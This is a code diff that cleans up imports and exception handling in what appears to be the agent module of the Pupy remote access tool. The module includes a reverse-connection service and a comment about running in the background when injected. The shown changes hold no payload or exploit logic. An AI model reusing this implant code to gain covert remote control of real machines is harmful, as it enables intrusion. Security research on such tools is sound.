@@ -31,30 +31,17 @@
 # POSSIBILITY OF SUCH DAMAGE
 # ---------------------------------------------------------------
 
-import site
 import sys
 import time
-import rpyc
 from rpyc.core.service import Service, ModuleNamespace
-from rpyc.lib.compat import execute, is_py3k
-import rpyc.core.stream
-import rpyc.utils.factory
+from rpyc.lib.compat import execute
 import threading
-import weakref
 import traceback
 import os
-import subprocess
-import threading
-import StringIO
 import json
-import urllib2
-import urllib
 import platform
-import re
-import ssl
 import random
 import imp
-import json
 import argparse
 from network import conf
 from network.lib.base_launcher import LauncherError
@@ -62,7 +49,6 @@ from network.lib.connection import PupyConnection
 from network.lib.streams.PupySocketStream import PupyChannel
 import logging
 import shlex
-import marshal
 import zlib
 import signal
 
@@ -115,7 +101,6 @@ def print_exception(tag=''):
     except:
         pass
 
-    import traceback
     trace = str(traceback.format_exc())
     error = ' '.join([ x for x in (
         tag, 'Exception:', trace
@@ -124,8 +109,9 @@ def print_exception(tag=''):
     if remote_print_error:
         try:
             remote_print_error(error)
-        except Exception, e:
+        except:
             pass
+
     elif dprint:
         dprint(error)
     elif debug:
@@ -445,14 +431,14 @@ class ReverseSlaveService(Service):
         for cleanup in self.exposed_cleanups:
             try:
                 cleanup()
-            except Exception as e:
+            except:
                 print_exception('[D]')
 
         self.exposed_cleanups = []
 
         try:
             self._conn.close()
-        except Exception as e:
+        except:
             print_exception('[DC]')
 
         if os.name == 'posix':
@@ -762,7 +748,6 @@ def rpyc_loop(launcher):
 if __name__ == "__main__":
     main()
 else:
-    import platform
     if not platform.system() == 'android':
         if not hasattr(platform, 'pupy_thread'):
             # to allow pupy to run in background when imported or injected
